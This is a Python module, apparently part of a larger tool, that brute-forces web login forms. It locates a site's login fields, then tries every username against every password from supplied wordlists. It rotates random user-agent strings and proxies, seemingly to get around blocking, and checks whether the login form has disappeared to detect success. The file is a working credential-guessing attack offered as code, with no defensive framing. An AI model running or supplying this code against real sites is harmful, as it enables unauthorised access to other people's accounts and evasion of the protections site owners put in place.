#!/usr/bin/python
# -*- coding:utf-8 -*-

from core import actions, utils, tbrowser
import mechanize


def parse_form(url):
    try:
        process = tbrowser.start_browser()
        user_agent = tbrowser.user_agent()
        process.addheaders = [('User-Agent', user_agent)]
        process.open(url)
        form_login_id, form_user_field, form_pass_field = tbrowser.get_login_form(process.forms())
        return form_login_id, form_user_field, form_pass_field
    except TypeError as error:
        utils.die("Can not find login form", error)

    except Exception as error:
        utils.die("Checking connection error", error)

    finally:
        process.close()


def handle(url, user_list, pass_list, set_proxy_list, set_key=''):
    form_login_id, form_user_field, form_pass_field = parse_form(url)
    for user_name in user_list:
        user_name = user_name.replace('\n', '')
        browser = tbrowser.start_browser()
        idx = 0
        for password in pass_list:
            password = password.replace('\n', '')
            user_agent = tbrowser.user_agent()
            browser.addheaders = [('User-Agent', user_agent)]
            if set_proxy_list:
                proxy_addr = actions.randomFromList(set_proxy_list)
                browser.set_proxies({"http": proxy_addr})
            browser.open(url)
            try:
                idx += 1
                browser.select_form(nr=form_login_id)
                browser.form[form_user_field] = user_name
                browser.form[form_pass_field] = password
                browser.submit()
                browser.reload()

                if not tbrowser.get_login_form(browser.forms()):
                    if set_key:
                        if set_key not in browser.response().read():
                            browser.close()
                            break
                    else:
                        browser.close()
                        break

            except mechanize.HTTPError as error:
                #    Get blocked
                pass

            browser.close()
